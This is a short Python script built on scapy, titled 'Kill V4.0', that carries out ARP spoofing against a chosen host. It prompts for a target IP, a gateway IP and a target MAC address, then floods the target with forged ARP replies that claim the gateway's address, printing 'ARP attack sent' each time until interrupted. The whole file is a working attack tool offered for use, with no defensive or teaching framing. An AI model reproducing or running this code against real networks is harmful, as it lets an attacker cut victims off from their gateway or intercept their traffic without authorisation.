import sys
from scapy.all import ARP, Ether, sendp

######################
#Kill V4.0
######################
#################
#By xiaozhao45
#################



# Obtain target IP and gateway IP addresses 
target_ip = input("Please enter the destination IP address: ")
gateway_ip = input("Please enter the gateway IP addre,Do not add/24 : ")
target_mac = input("Please enter the destination MAC address: ")
if not target_ip or not gateway_ip:
    print("Some information is empty!")
    target_ip = input("Please enter the destination IP address: ")
    gateway_ip = input("Please enter the gateway IP addres: ")
    target_mac = input("Please enter the destination MAC address: ")


# Construct ARP request packets and send them to the target IP and gateway IP  
packet = Ether(dst=target_mac) / ARP(op=1, pdst=target_ip, hwdst="00:00:00:00:00:00", psrc=gateway_ip)
sendp(packet)

# Fire
while True:
    try:
        
        packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst="00:00:00:00:00:00", psrc=gateway_ip)
        sendp(packet)
        print(f"ARP attack sent to {target_ip}")
    except KeyboardInterrupt:
        # 如果用户按下Ctrl-C，则退出程序
        print("User Interrupt Program,Cease fire")
        sys.exit(0)
